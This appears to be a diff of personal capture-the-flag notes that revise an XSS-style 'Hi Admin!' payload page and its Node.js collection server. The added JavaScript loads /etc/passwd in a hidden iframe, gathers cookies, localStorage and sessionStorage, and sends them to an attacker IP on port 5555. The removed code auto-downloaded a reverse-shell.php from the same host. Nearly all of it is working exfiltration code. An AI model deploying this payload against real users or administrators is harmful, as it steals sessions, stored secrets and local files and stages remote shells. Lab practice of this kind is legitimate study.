@@ -79,26 +79,18 @@ sudo python3 -m http.server 4444
     <title>CTF</title>
     <script>
       (async function() {
-        const YOUR_SERVER_IP = "10.10.10.100"
-
+        const YOUR_SERVER_IP = "10.10.14.46";
+        const targetFile = "/etc/passwd";  // Example file path to try LFI
+        
         try {
-          // Create an anchor element dynamically
-          var link = document.createElement('a');
-        
-          // Set the href to your hosted reverse shell
-          link.href = `http://${YOUR_SERVER_IP}:4444/reverse-shell.php`;
-        
-          // Set the download attribute to suggest a filename for the browser
-          link.download = 'reverse-shell.php';
-        
-          // Append the link to the document body
-          document.body.appendChild(link);
-        
-          // Programmatically click the link to start the download
-          link.click();
-          
-          // Remove the link from the DOM
-          document.body.removeChild(link);
+          // Attempt to load a local file via image or another method
+          var iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = `file://${targetFile}`;  // Adjust based on the vulnerability you're exploiting
+          document.body.appendChild(iframe);
+
+          // Delay to give time for the iframe to load
+          await new Promise(resolve => setTimeout(resolve, 2000));
 
           // Collect User-Agent
           let userAgent = navigator.userAgent;
@@ -128,18 +120,26 @@ sudo python3 -m http.server 4444
             domain: document.domain
           };
 
+          // Try to grab content from the iframe (if accessible)
+          let fileContents = iframe.contentDocument ? iframe.contentDocument.body.innerText : "File access failed";
+
           // Create a final object to hold all the data
           let data = {
             userAgent: userAgent,
             cookies: cookies,
             localStorage: localStorageData,
             sessionStorage: sessionStorageData,
-            document: documentData
+            document: documentData,
+            fileContents: fileContents
           };
 
           // Send the data to your server
           let img = new Image();
           img.src = `http://${YOUR_SERVER_IP}:5555/?allData=` + encodeURIComponent(JSON.stringify(data));
+
+          // Clean up the iframe
+          document.body.removeChild(iframe);
+
         } catch (error) {
           let img = new Image();
           img.src = `http://${YOUR_SERVER_IP}:5555/?error=` + encodeURIComponent(error);
@@ -148,7 +148,6 @@ sudo python3 -m http.server 4444
     </script>
   </head>
   <body>
-    <a id="downloadLink" href="http://YOUR_SERVER_IP:5555/reverse-shell.php" download="reverse-shell.php" style="display:none;"></a>
     <h1>Hi Admin!</h1>
   </body>
 </html>
@@ -196,6 +195,10 @@ http.createServer((req, res) => {
     console.log('\nDocument Data:');
     console.table(receivedData.document);
 
+    // Display Remote File Content
+    console.log('\Remote File Content:');
+    console.table(receivedData.fileContents);   
+
   } else if (queryObject.error) {
     // Log any errors that were encountered
     console.error('Error: ', decodeURIComponent(queryObject.error));
@@ -209,7 +212,6 @@ http.createServer((req, res) => {
 }).listen(5555, () => {
   console.log('Server listening on port 5555');
 });
-
 ```
 
 ## Login brute-force with `hydra`
